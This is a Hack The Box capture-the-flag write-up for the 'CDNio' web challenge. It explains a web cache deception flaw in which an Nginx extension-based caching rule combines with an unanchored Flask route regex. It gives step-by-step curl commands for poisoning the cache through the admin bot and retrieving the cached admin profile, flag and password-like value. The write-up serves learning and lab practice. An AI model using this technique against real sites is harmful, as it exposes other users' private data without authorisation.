---
title: CDNio Writeup 
date: 2025-11-23 18:00 +0100
categories: [Pentesting, Hack The Box, WEB]
tags: [web, pentest,HTB,writeup, cheat-sheet]
author: F1Z3R
---

# CDNio

## Challenge Overview

**Vulnerability Type:** Web Cache Deception (WCD)

**Goal:** Retrieve the Admin's API Key/Flag.

**Components:** Nginx (Reverse Proxy/Cache) + Flask (Backend Application).

## 1. Code Analysis

The vulnerability stems from a logical discrepancy between how the **Nginx Proxy** handles caching and how the **Flask Backend** handles routing.

### The Proxy (Nginx)

The Nginx configuration contains a dangerous caching rule. It uses a regular expression to determine cacheability based solely on the file extension, ignoring the actual content type or authentication headers.

```
# nginx.conf
location ~* \.(css|js|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot)$ {
    proxy_cache cache;
    proxy_cache_valid 200 3m;
    add_header Cache-Control "public";
    # ...
}

```

- **Behavior:** Any URL ending in `.css` (or other static extensions) is cached for 3 minutes.
- **Risk:** If a dynamic page (containing private data) can be accessed via a URL ending in `.css`, Nginx will cache that private data publicly.

### The Backend (Flask)

The Python application uses a permissive Regular Expression to route requests to the user profile.

```
# app.py
@main_bp.route('/<path:subpath>', methods=['GET'])
@jwt_required
def profile(subpath):
    # VULNERABILITY HERE:
    if re.match(r'.*^profile', subpath):
        # ... fetches user data ...
        return jsonify({...}), 200

```

- **Behavior:** The regex `re.match(r'.*^profile', subpath)` checks if the path *starts* with "profile". It **does not** enforce the end of the string (missing `$`).
- **Consequence:** A request to `/profile/file.css` satisfies this condition. Flask ignores the `.css` extension and serves the JSON profile data.

## 2. The Attack Logic

We can exploit this "disagreement" to poison the cache:

1. **Attacker:** Sends a URL `profile/file.css` to the Admin Bot.
2. **Bot (Admin):** Visits the URL with valid credentials.
3. **Flask:** Sees path starting with `profile`. Returns **Admin JSON Data** (Status 200).
4. **Nginx:** Sees URL ending in `.css`. Caches the **Admin JSON Data** as a static CSS file.
5. **Attacker:** Requests `http://target/profile/file.css` (no credentials).
6. **Nginx:** Serves the cached file containing the Admin's data.

## 3. Exploitation (Proof of Concept)

### Step A: Reconnaissance & Setup

First, we register and login to obtain a low-privileged token. This is required to interact with the `/visit` endpoint (the bot).

**Register:**

```
curl -X POST http://83.136.251.105:31637/register\
     -H "Content-Type: application/json" \
     -d '{"username":"hacker","password":"password123","email":"hacker@test.com"}'

```

**Login:**

```
curl -X POST http://83.136.251.105:31637/ \
     -H "Content-Type: application/json" \
     -d '{"username":"hacker","password":"password123"}'

```

*Received Token:* `eyJhbGciOiJIUzI1Ni...`

### Step B: Poisoning the Cache

We instruct the Admin Bot to visit the vulnerable path. We use `profile.css` as the URI.

```
curl -X POST http://83.136.251.105:31637/visit \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer <MY_TOKEN>" \
     -d '{"uri": "profile/file.css"}'

```

**Output:**

```
{"message":"Visiting URI: profile/file.css"}

```

*At this moment, the bot accessed the page, Flask returned the flag, and Nginx cached it.*

### Step C: Retrieving the Flag

Now we request the same resource. Nginx serves the cached response without contacting the backend (bypassing authentication).

```
curl -X GET http://83.136.251.105:31637/profile/file.css

```

**Proof of Success:**

```
{
  "api_key": "HTB{cDN_10_OoOoOoO_Sc1_F1_iOOOO0000}",
  "created_at": "2025-11-23 17:21:43",
  "email": "admin@hackthebox.com",
  "id": 1,
  "password": "DwB2oVfrHDRH1DcJWv4ktA==",
  "username": "admin"
}

```